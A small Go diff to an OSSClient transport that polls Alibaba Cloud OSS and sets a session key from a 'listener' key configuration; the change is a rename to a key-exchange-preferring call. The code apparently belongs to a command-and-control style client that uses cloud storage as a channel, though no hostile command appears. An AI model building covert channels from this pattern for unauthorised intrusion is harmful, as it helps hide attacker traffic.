@@ -18,7 +18,6 @@ import (
 	"github.com/aliyun/aliyun-oss-go-sdk/oss"
 )
 
-
 // OSSClient 实现 communication.Transport（OSS 轮询模型）。
 type OSSClient struct {
 	bucket       *oss.Bucket
@@ -105,7 +104,7 @@ func (s *OSSClient) Connect(host string) error {
 
 	// 会话密钥
 	salt, masterKey := app.GetListenerKeyConfig("oss")
-	if err := encrypt.GlobalClientKeyManager.SetSessionKey(salt[:16], masterKey[:32]); err != nil {
+	if err := encrypt.GlobalClientKeyManager.SetSessionKeyPreferringKX(salt[:16], masterKey[:32]); err != nil {
 		s.fail()
 		return err
 	}
